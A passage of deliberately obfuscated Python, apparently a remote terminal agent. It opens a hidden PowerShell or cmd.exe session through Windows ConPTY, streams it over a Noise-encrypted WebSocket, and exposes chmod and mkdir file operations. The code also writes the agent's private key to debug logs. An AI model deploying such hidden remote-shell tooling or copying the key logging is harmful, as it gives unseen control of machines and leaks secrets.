                    O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_286, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u004e\\u006f\\u0074\\u0020\\u0066\\u006f\\u0075\\u006e\\u0064', 'unicode_escape')})
                    continue
                O0_var_289 = self._parse_mode(O0_var_287)
                if recursive and O0_var_288.is_dir():
                    for O0_var_290, O0_var_291, O0_var_292 in os.walk(O0_var_288):
                        os.chmod(O0_var_290, O0_var_289)
                        for O0_var_293 in O0_var_291:
                            os.chmod(os.path.join(O0_var_290, O0_var_293), O0_var_289)
                        for O0_var_294 in O0_var_292:
                            os.chmod(os.path.join(O0_var_290, O0_var_294), O0_var_289)
                else:
                    os.chmod(O0_var_288, O0_var_289)
                O0_var_295 = stat.filemode(O0_var_288.stat().st_mode)
                O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_288.relative_to(self.O0_fn_56)), codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u0065\\u0064', 'unicode_escape'): O0_var_287, codecs.decode('\\u0061\\u0070\\u0070\\u006c\\u0069\\u0065\\u0064', 'unicode_escape'): O0_var_295, codecs.decode('\\u006d\\u006f\\u0064\\u0065\\u005f\\u006f\\u0063\\u0074\\u0061\\u006c', 'unicode_escape'): oct(stat.S_IMODE(O0_var_288.stat().st_mode)), codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape')})
                self._audit(codecs.decode('\\u0063\\u0068\\u006d\\u006f\\u0064', 'unicode_escape'), O0_var_286, codecs.decode('\\u006f\\u006b', 'unicode_escape'), {codecs.decode('\\u006d\\u006f\\u0064\\u0065', 'unicode_escape'): O0_var_287, codecs.decode('\\u0072\\u0065\\u0063\\u0075\\u0072\\u0073\\u0069\\u0076\\u0065', 'unicode_escape'): recursive})
            except HTTPException as e:
                O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_286, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e.detail)})
            except ValueError as e:
                O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_286, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(e)})
            except PermissionError:
                O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_286, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): codecs.decode('\\u0050\\u0065\\u0072\\u006d\\u0069\\u0073\\u0073\\u0069\\u006f\\u006e\\u0020\\u0064\\u0065\\u006e\\u0069\\u0065\\u0064', 'unicode_escape')})
            except Exception as e:
                O0_var_285.append({codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_286, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): str(type(e).__name__) + codecs.decode('\\u003a\\u0020', 'unicode_escape') + str(e)})
        O0_var_296 = sum((1 for O0_var_297 in O0_var_285 if O0_var_297[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == codecs.decode('\\u006f\\u006b', 'unicode_escape')))
        return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape') if O0_var_296 > 0 else codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'), codecs.decode('\\u0074\\u006f\\u0074\\u0061\\u006c', 'unicode_escape'): len(O0_var_284), codecs.decode('\\u0073\\u0075\\u0063\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'): O0_var_296, codecs.decode('\\u0072\\u0065\\u0073\\u0075\\u006c\\u0074\\u0073', 'unicode_escape'): O0_var_285}

    def create_directory(self, O0_var_298: str) -> dict:
        O0_var_299 = self._safe_path(O0_var_298)
        if O0_var_299.exists():
            raise HTTPException(409, codecs.decode('\\u0045\\u0078\\u0069\\u0073\\u0074\\u0073\\u003a\\u0020', 'unicode_escape') + str(O0_var_298))
        try:
            O0_var_299.mkdir(parents=True)
            self._audit(codecs.decode('\\u006d\\u006b\\u0064\\u0069\\u0072', 'unicode_escape'), str(O0_var_299), codecs.decode('\\u006f\\u006b', 'unicode_escape'))
            return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): codecs.decode('\\u006f\\u006b', 'unicode_escape'), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): str(O0_var_299.relative_to(self.O0_fn_56))}
        except Exception as e:
            raise HTTPException(500, codecs.decode('\\u004d\\u006b\\u0064\\u0069\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020', 'unicode_escape') + str(e))

class NoiseSessionWrapper:
    codecs.decode('\\u000a\\u0020\\u0020\\u0020\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0050\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u5c01\\u88c5\\u7c7b\\u0020\\u0028\\u9ed1\\u76d2\\u72b6\\u6001\\u673a\\u0029\\u000a\\u0020\\u0020\\u0020\\u0020\\u4e1a\\u52a1\\u5c42\\u65e0\\u9700\\u5173\\u5fc3\\u5e95\\u5c42\\u7684\\u63e1\\u624b\\u7ec6\\u8282\\uff0c\\u76f4\\u63a5\\u8c03\\u7528\\u5bf9\\u5e94\\u65b9\\u6cd5\\u5373\\u53ef\\u3002\\u000a\\u0020\\u0020\\u0020\\u0020', 'unicode_escape')

    def __init__(self, is_initiator: bool, local_priv_b64: str, expected_remote_pub_b64: str=None):
        self.noise = NoiseConnection.from_name(b'Noise_XX_25519_ChaChaPoly_BLAKE2s')
        if is_initiator:
            self.noise.set_as_initiator()
        else:
            self.noise.set_as_responder()
        if local_priv_b64:
            O0_var_300 = base64.b64decode(local_priv_b64)
            self.noise.set_keypair_from_private_bytes(Keypair.STATIC, O0_var_300)
        if expected_remote_pub_b64:
            O0_var_301 = base64.b64decode(expected_remote_pub_b64)
            self.noise.set_keypair_from_public_bytes(Keypair.REMOTE_STATIC, O0_var_301)
        self.noise.set_prologue(b'kisama_terminal_v1')
        self.noise.start_handshake()

    @property
    def is_established(self) -> bool:
        return self.noise.handshake_finished

    def process_handshake(self, O0_var_302: bytes) -> bytes:
        if O0_var_302:
            self.noise.read_message(O0_var_302)
        if not self.noise.handshake_finished:
            return self.noise.write_message(b'')
        else:
            return b''

    def encrypt(self, O0_var_303: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u52a0\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.encrypt(O0_var_303)

    def decrypt(self, O0_var_304: bytes) -> bytes:
        if not self.is_established:
            raise RuntimeError(codecs.decode('\\u63e1\\u624b\\u672a\\u5b8c\\u6210\\uff0c\\u65e0\\u6cd5\\u89e3\\u5bc6\\u6570\\u636e', 'unicode_escape'))
        return self.noise.decrypt(O0_var_304)
_IS_WINDOWS = os.name == codecs.decode('\\u006e\\u0074', 'unicode_escape')
if _IS_WINDOWS:
    import ctypes
    import msvcrt
    from ctypes import wintypes
    _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 131094
    _EXTENDED_STARTUPINFO_PRESENT = 524288
    _CREATE_UNICODE_ENVIRONMENT = 1024
    _CREATE_NO_WINDOW_FLAG = getattr(subprocess, codecs.decode('\\u0043\\u0052\\u0045\\u0041\\u0054\\u0045\\u005f\\u004e\\u004f\\u005f\\u0057\\u0049\\u004e\\u0044\\u004f\\u0057', 'unicode_escape'), 0)
    _STARTF_USESTDHANDLES = 256

    class _COORD(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0058', 'unicode_escape'), ctypes.c_short), (codecs.decode('\\u0059', 'unicode_escape'), ctypes.c_short)]

    class _PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0068\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0064\\u0077\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0049\\u0064', 'unicode_escape'), wintypes.DWORD)]

    class _STARTUPINFOEX(ctypes.Structure):
        _fields_ = [(codecs.decode('\\u0063\\u0062', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0044\\u0065\\u0073\\u006b\\u0074\\u006f\\u0070', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u006c\\u0070\\u0054\\u0069\\u0074\\u006c\\u0065', 'unicode_escape'), wintypes.LPWSTR), (codecs.decode('\\u0064\\u0077\\u0058', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0053\\u0069\\u007a\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0058\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0059\\u0043\\u006f\\u0075\\u006e\\u0074\\u0043\\u0068\\u0061\\u0072\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u0069\\u006c\\u006c\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0064\\u0077\\u0046\\u006c\\u0061\\u0067\\u0073', 'unicode_escape'), wintypes.DWORD), (codecs.decode('\\u0077\\u0053\\u0068\\u006f\\u0077\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u0063\\u0062\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), wintypes.WORD), (codecs.decode('\\u006c\\u0070\\u0052\\u0065\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064\\u0032', 'unicode_escape'), ctypes.c_void_p), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0049\\u006e\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u004f\\u0075\\u0074\\u0070\\u0075\\u0074', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u0068\\u0053\\u0074\\u0064\\u0045\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), wintypes.HANDLE), (codecs.decode('\\u006c\\u0070\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), ctypes.c_void_p)]

    def _probe_conpty():
        try:
            O0_var_305 = ctypes.WinDLL(codecs.decode('\\u006b\\u0065\\u0072\\u006e\\u0065\\u006c\\u0033\\u0032', 'unicode_escape'), use_last_error=True)
        except Exception:
            return None
        for O0_var_306 in (codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0052\\u0065\\u0073\\u0069\\u007a\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0043\\u006c\\u006f\\u0073\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape')):
            if not hasattr(O0_var_305, O0_var_306):
                return None
        O0_var_305.CreatePseudoConsole.restype = ctypes.c_long
        O0_var_305.CreatePseudoConsole.argtypes = [_COORD, wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        O0_var_305.ResizePseudoConsole.restype = ctypes.c_long
        O0_var_305.ResizePseudoConsole.argtypes = [wintypes.HANDLE, _COORD]
        O0_var_305.ClosePseudoConsole.restype = None
        O0_var_305.ClosePseudoConsole.argtypes = [wintypes.HANDLE]
        O0_var_305.InitializeProcThreadAttributeList.restype = wintypes.BOOL
        O0_var_305.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_305.UpdateProcThreadAttribute.restype = wintypes.BOOL
        O0_var_305.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_305.DeleteProcThreadAttributeList.restype = None
        O0_var_305.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
        O0_var_305.CreateProcessW.restype = wintypes.BOOL
        O0_var_305.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(_STARTUPINFOEX), ctypes.POINTER(_PROCESS_INFORMATION)]
        O0_var_305.CloseHandle.restype = wintypes.BOOL
        O0_var_305.CloseHandle.argtypes = [wintypes.HANDLE]
        return O0_var_305
    _KERNEL32 = _probe_conpty()

    def _windows_env_block(env: Dict[str, str]):
        O0_var_307 = codecs.decode('\\u0000', 'unicode_escape').join((str(O0_var_308) + codecs.decode('\\u003d', 'unicode_escape') + str(O0_var_309) for O0_var_308, O0_var_309 in env.items())) + codecs.decode('\\u0000', 'unicode_escape')
        return ctypes.create_unicode_buffer(O0_var_307)

    def _taskkill(O0_var_310: int):
        if not O0_var_310:
            return
        try:
            subprocess.run([codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u006b\\u0069\\u006c\\u006c', 'unicode_escape'), codecs.decode('\\u002f\\u0046', 'unicode_escape'), codecs.decode('\\u002f\\u0054', 'unicode_escape'), codecs.decode('\\u002f\\u0050\\u0049\\u0044', 'unicode_escape'), str(O0_var_310)], creationflags=_CREATE_NO_WINDOW_FLAG, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass

    class _ConPtyTerminal:
        codecs.decode('\\u57fa\\u4e8e\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0020\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u0028\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u0020\\u7684\\u771f\\u5b9e\\u7ec8\\u7aef\\u5b9e\\u73b0', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_311: int, O0_var_312: int, cwd: str=None):
            self.shell = shell
            self.env = env
            self.rows = O0_var_311
            self.cols = O0_var_312
            self.cwd = cwd
            self._hpc = None
            self._attr_list = None
            self._in_r = self._in_w = None
            self._out_r = self._out_w = None
            self._h_process = None
            self.pid = 0

        def start(self):
            if _KERNEL32 is None:
                raise RuntimeError(codecs.decode('\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0020\\u4e0d\\u53ef\\u7528', 'unicode_escape'))
            O0_var_313, O0_var_314 = os.pipe()
            O0_var_315, O0_var_316 = os.pipe()
            try:
                O0_var_317 = msvcrt.get_osfhandle(O0_var_313)
                O0_var_318 = msvcrt.get_osfhandle(O0_var_316)
                O0_var_319 = wintypes.HANDLE()
                O0_var_320 = _KERNEL32.CreatePseudoConsole(_COORD(self.cols, self.rows), O0_var_317, O0_var_318, 0, ctypes.byref(O0_var_319))
                if O0_var_320 != 0:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u5931\\u8d25\\u0020\\u0028\\u0048\\u0052\\u0045\\u0053\\u0055\\u004c\\u0054\\u003d\\u0030\\u0078', 'unicode_escape') + format(O0_var_320 & 4294967295, codecs.decode('\\u0078', 'unicode_escape')) + codecs.decode('\\u0029', 'unicode_escape'))
                self._hpc = O0_var_319.value
                self._in_r, self._in_w = (O0_var_313, O0_var_314)
                self._out_r, self._out_w = (O0_var_315, O0_var_316)
                os.set_blocking(self._out_r, False)
                O0_var_321 = codecs.decode('\\u0022', 'unicode_escape') + str(self.shell) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in self.shell else self.shell
                O0_var_322 = _windows_env_block(self.env)
                O0_var_323 = _STARTUPINFOEX()
                O0_var_323.cb = ctypes.sizeof(_STARTUPINFOEX)
                O0_var_323.dwFlags = _STARTF_USESTDHANDLES
                O0_var_324 = ctypes.c_size_t(0)
                _KERNEL32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(O0_var_324))
                O0_var_325 = ctypes.create_string_buffer(O0_var_324.value)
                if not _KERNEL32.InitializeProcThreadAttributeList(O0_var_325, 1, 0, ctypes.byref(O0_var_324)):
                    raise OSError(codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                if not _KERNEL32.UpdateProcThreadAttribute(O0_var_325, 0, _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, self._hpc, ctypes.sizeof(wintypes.HANDLE), None, None):
                    raise OSError(codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._attr_list = O0_var_325
                O0_var_323.lpAttributeList = ctypes.cast(O0_var_325, ctypes.c_void_p)
                O0_var_326 = _PROCESS_INFORMATION()
                O0_var_327 = _EXTENDED_STARTUPINFO_PRESENT | _CREATE_UNICODE_ENVIRONMENT
                O0_var_328 = _KERNEL32.CreateProcessW(None, O0_var_321, None, None, False, O0_var_327, ctypes.cast(O0_var_322, ctypes.c_void_p), self.cwd, ctypes.byref(O0_var_323), ctypes.byref(O0_var_326))
                if not O0_var_328:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0057\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._h_process = O0_var_326.hProcess
                self.pid = O0_var_326.dwProcessId
                if O0_var_326.hThread:
                    _KERNEL32.CloseHandle(O0_var_326.hThread)
            except Exception:
                self.close()
                raise

        def set_size(self, O0_var_329: int, O0_var_330: int):
            if self._hpc is None or _KERNEL32 is None:
                return
            try:
                _KERNEL32.ResizePseudoConsole(self._hpc, _COORD(O0_var_330, O0_var_329))
            except Exception:
                pass

        def read(self, O0_var_331: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_331)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            if self._hpc is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.ClosePseudoConsole(self._hpc)
                except Exception:
                    pass
                self._hpc = None
            if self._attr_list is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.DeleteProcThreadAttributeList(self._attr_list)
                except Exception:
                    pass
                self._attr_list = None
            if self._h_process is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.CloseHandle(self._h_process)
                except Exception:
                    pass
                self._h_process = None
            for O0_var_332 in (self._in_r, self._in_w, self._out_r, self._out_w):
                if O0_var_332 is not None:
                    try:
                        os.close(O0_var_332)
                    except Exception:
                        pass
            self._in_r = self._in_w = self._out_r = self._out_w = None

        def kill_tree(self):
            _taskkill(self.pid)

    class _PipeTerminal:
        codecs.decode('\\u65e7\\u7248\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ba1\\u9053\\u56de\\u9000\\u5b9e\\u73b0\\u0020\\u0028\\u65e0\\u0020\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u003a\\u0020\\u65e0\\u771f\\u5b9e\\u7ec8\\u7aef\\u002c\\u0020\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065\\u0020\\u4e3a\\u0020\\u006e\\u006f\\u002d\\u006f\\u0070', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_333: int, O0_var_334: int, cwd: str=None):
            self.shell = shell
            self.env = env
            self.cwd = cwd
            self._in_w = self._out_r = None
            self._proc = None
            self.pid = 0

        def start(self):
            O0_var_335, O0_var_336 = os.pipe()
            O0_var_337, O0_var_338 = os.pipe()
            self._proc = subprocess.Popen([self.shell], stdin=O0_var_335, stdout=O0_var_338, stderr=O0_var_338, env=self.env, cwd=self.cwd, creationflags=_CREATE_NO_WINDOW_FLAG)
            os.close(O0_var_335)
            os.close(O0_var_338)
            self._in_w = O0_var_336
            self._out_r = O0_var_337
            os.set_blocking(self._out_r, False)
            self.pid = self._proc.pid

        def set_size(self, O0_var_339: int, O0_var_340: int):
            return None

        def read(self, O0_var_341: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_341)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            for O0_var_342 in (self._in_w, self._out_r):
                if O0_var_342 is not None:
                    try:
                        os.close(O0_var_342)
                    except Exception:
                        pass
            self._in_w = self._out_r = None
            if self._proc is not None:
                try:
                    if self._proc.poll() is None:
                        self._proc.terminate()
                except Exception:
                    pass
                self._proc = None

        def kill_tree(self):
            _taskkill(self.pid)

    def _create_windows_backend(shell: str, env: Dict[str, str], O0_var_343: int, O0_var_344: int, cwd: str=None):
        if _KERNEL32 is not None:
            return _ConPtyTerminal(shell, env, O0_var_343, O0_var_344, cwd)
        return _PipeTerminal(shell, env, O0_var_343, O0_var_344, cwd)

    def _windows_default_shell() -> str:
        O0_var_345 = shutil.which(codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        if O0_var_345:
            return O0_var_345
        O0_var_346 = os.environ.get(codecs.decode('\\u0043\\u004f\\u004d\\u0053\\u0050\\u0045\\u0043', 'unicode_escape'))
        if O0_var_346 and os.path.exists(O0_var_346):
            return O0_var_346
        return codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')
else:

    def _windows_default_shell() -> str:
        return codecs.decode('', 'unicode_escape')

    def _create_windows_backend(*args, **kwargs):
        raise RuntimeError(codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u540e\\u7aef\\u4ec5\\u652f\\u6301\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u5e73\\u53f0', 'unicode_escape'))

class TerminalSessionHandler:

    def __init__(self):
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.terminal = None
        self.websocket: WebSocket = None
        self.request_id: str = None
        self.AGENT_PRIVATE_KEY = Config.keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].private_b64
        Logger.debug(self.AGENT_PRIVATE_KEY)
        self.CONTROL_PUBLIC_KEY = Config.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].public_b64
        Logger.debug(self.CONTROL_PUBLIC_KEY)
        self.cipher = NoiseSessionWrapper(is_initiator=False, local_priv_b64=self.AGENT_PRIVATE_KEY, expected_remote_pub_b64=self.CONTROL_PUBLIC_KEY)

    def _read_key_file(self, O0_var_347: str) -> str:
        try:
            if os.path.exists(O0_var_347):
                with open(O0_var_347, codecs.decode('\\u0072', 'unicode_escape')) as O0_var_348:
                    return O0_var_348.read().strip()
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u8bfb\\u53d6\\u5bc6\\u94a5\\u6587\\u4ef6\\u0020', 'unicode_escape') + str(O0_var_347) + codecs.decode('\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    async def cleanup(self):
        if self.request_id:
            Logger.info(codecs.decode('\\u005b', 'unicode_escape') + str(self.request_id) + codecs.decode('\\u005d\\u0020\\u6267\\u884c\\u7ec8\\u7aef\\u8d44\\u6e90\\u6e05\\u7406\\u002e\\u002e\\u002e', 'unicode_escape'))
        O0_var_349 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_349 is not None:
            O0_var_349.kill_tree()
            O0_var_349.close()
            self.terminal = None
        if self.process:
            try:
                if hasattr(os, codecs.decode('\\u006b\\u0069\\u006c\\u006c\\u0070\\u0067', 'unicode_escape')):
                    os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                else:
                    self.process.terminate()
                try:
                    await asyncio.wait_for(self.process.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    self.process.kill()
            except Exception:
                pass
            self.process = None
        for O0_var_350 in [codecs.decode('\\u006d\\u0061\\u0073\\u0074\\u0065\\u0072\\u005f\\u0066\\u0064', 'unicode_escape'), codecs.decode('\\u0073\\u006c\\u0061\\u0076\\u0065\\u005f\\u0066\\u0064', 'unicode_escape')]:
            O0_var_351 = getattr(self, O0_var_350)
            if O0_var_351 is not None:
                try:
                    os.close(O0_var_351)
                except Exception:
                    pass
                setattr(self, O0_var_350, None)
        if self.websocket:
            try:
                await self.websocket.close(code=1000)
            except Exception:
                pass
            finally:
                self.websocket = None

    async def _do_noise_handshake(self, O0_var_352: WebSocket, O0_var_353):
        O0_var_353(codecs.decode('\\U0001f91d\\u0020\\u5f00\\u59cb\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u52a0\\u5bc6\\u63e1\\u624b\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            O0_var_354 = await O0_var_352.receive_bytes()
            O0_var_355 = self.cipher.process_handshake(O0_var_354)
            await O0_var_352.send_bytes(O0_var_355)
            O0_var_356 = await O0_var_352.receive_bytes()
            self.cipher.process_handshake(O0_var_356)
